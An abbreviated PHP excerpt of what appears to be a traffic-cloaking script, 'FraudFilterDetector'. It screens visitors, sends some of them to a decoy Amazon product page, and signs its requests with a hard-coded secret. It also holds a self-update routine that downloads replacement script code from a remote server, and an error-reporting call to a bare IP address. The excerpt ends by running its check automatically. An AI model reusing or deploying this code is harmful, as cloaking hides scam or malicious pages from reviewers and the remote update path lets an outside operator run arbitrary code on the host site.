...
class FraudFilterDetector_fmqgm {
    ...
    function isSignatureValid($sign, $time) {
        $str = 'a426f526-6c9c-422a-829c-b656f1a78b28.'.$this->getClid().'.'.$time;
        $sha = sha1($str);
        return $sign === $sha;
    }
...
<?php
    ...
    function safeAction() {
        $this->redirect('https://www.amazon.com/Clorox-Scrub-Singles-Heavy-Scouring/dp/B019HW3TSQ/ref=sr_1_2?crid=1E8VA3BQCPUL2&dchild=1&keywords=clorox+wipes&qid=1591386398&sprefix=clothing%2Caps%2C1001&sr=8-2');
    }
    ...
    function getUpgradeScriptViaContents($home, $fileName) {
        $opts = array('http' =>
            array(
                'method'  => 'GET',
                'header' => 'x-ff-secret: a426f526-6c9c-422a-829c-b656f1a78b28',
                'timeout' => 2
            )
        );
    ...
    function upgradeScript($home, $fileName) {
        ...
        if ($output === false || !$this->isSignature2Valid($output)) {
            ...
            $headers[] = 'x-ff-secret: a426f526-6c9c-422a-829c-b656f1a78b28';
...
";
    ...
    function fillAllPostHeaders() {
        ...
        $headers[] = 'X-FF-P: a426f526-6c9c-422a-829c-b656f1a78b28';
    ...
    function notifyAboutError($message) {
        ...
        $url = 'http://139.59.212.55/ff-notify.html?v=ff1&guid=fmqgm&m='.$message;
        $ch = curl_init($url);
...
$fraudFilterDetector_fmqgm = new FraudFilterDetector_fmqgm();
$fraudFilterDetector_fmqgm->check();
